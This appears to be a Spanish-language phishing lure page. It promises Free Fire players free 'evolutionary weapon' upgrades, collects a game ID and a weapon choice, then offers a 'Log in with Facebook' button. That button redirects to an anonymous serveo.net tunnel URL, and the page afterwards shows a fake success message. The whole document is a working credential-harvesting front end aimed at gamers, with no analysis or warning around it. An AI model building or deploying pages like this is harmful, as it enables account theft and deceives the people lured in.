<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mejorar Armas Evolutivas</title>
    <style>
        /* Fondo gradiente RGB (amarillo, rojo y azul eléctrico) */
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(45deg, #ffcc00, #ff0000, #0000ff);
            background-size: 400% 400%;
            animation: gradientAnimation 10s ease infinite;
            color: white;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        @keyframes gradientAnimation {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        h1 {
            font-size: 2.5rem;
            margin-bottom: 20px;
        }

        .form-container {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .input-id {
            padding: 10px;
            font-size: 1rem;
            margin: 10px;
            border: 2px solid white;
            border-radius: 5px;
            background-color: transparent;
            color: white;
            width: 250px;
        }

        .weapon-options {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 20px;
            margin-bottom: 20px;
            max-width: 800px;
            width: 100%;
        }

        .weapon {
            padding: 20px;
            border: 2px solid white;
            border-radius: 5px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: transform 0.3s;
        }

        .weapon:hover {
            transform: scale(1.1);
        }

        .weapon img {
            width: 40px;
            margin-right: 10px;
        }

        .weapon-name {
            font-size: 1.2rem;
        }

        .login-button {
            padding: 15px 25px;
            background-color: #00aaff;
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 1.1rem;
            cursor: pointer;
            margin-top: 20px;
            display: none;
        }

        .loading {
            font-size: 1.5rem;
            display: none;
            margin-top: 20px;
        }

        .success-message {
            font-size: 1.5rem;
            color: green;
            display: none;
        }
    </style>
</head>
<body>

    <h1>Mejorar Armas Evolutivas</h1>

    <div class="form-container">
        <label for="id-input">Introduce tu ID de Free Fire:</label>
        <input type="text" id="id-input" class="input-id" placeholder="ID de Free Fire">
        <button onclick="handleIDSubmit()">Enviar</button>
    </div>

    <div id="weapon-container" class="weapon-options" style="display:none;">
        <div class="weapon" onclick="selectWeapon('MP40')">
            <img src="mp40-icon.png" alt="MP40">
            <span class="weapon-name">MP40</span>
        </div>
        <div class="weapon" onclick="selectWeapon('AK')">
            <img src="ak-icon.png" alt="AK">
            <span class="weapon-name">AK</span>
        </div>
        <div class="weapon" onclick="selectWeapon('UMP')">
            <img src="ump-icon.png" alt="UMP">
            <span class="weapon-name">UMP</span>
        </div>
        <div class="weapon" onclick="selectWeapon('M1887')">
            <img src="m1887-icon.png" alt="M1887">
            <span class="weapon-name">M1887</span>
        </div>
        <div class="weapon" onclick="selectWeapon('M1014')">
            <img src="m1014-icon.png" alt="M1014">
            <span class="weapon-name">M1014</span>
        </div>
    </div>

    <button id="login-button" class="login-button" onclick="login()">Iniciar sesión en Facebook</button>

    <div id="loading" class="loading">Cargando...</div>
    <div id="success-message" class="success-message">Objeto enviado exitosamente ✅</div>

    <script>
        function handleIDSubmit() {
            var userId = document.getElementById('id-input').value;
            if (userId.trim() !== "") {
                document.getElementById('weapon-container').style.display = 'grid';
            } else {
                alert("Por favor, ingresa tu ID de Free Fire.");
            }
        }

        function selectWeapon(weapon) {
            selectedWeapon = weapon;
            document.getElementById('login-button').style.display = 'inline-block';
        }

        function login() {
            window.location.href = "https://27eb4e9a230309a3c295636c2c537a11.serveo.net";
            document.getElementById('loading').style.display = 'inline';
            setTimeout(function() {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('success-message').style.display = 'block';
            }, 5000);
        }
    </script>

</body>
</html>
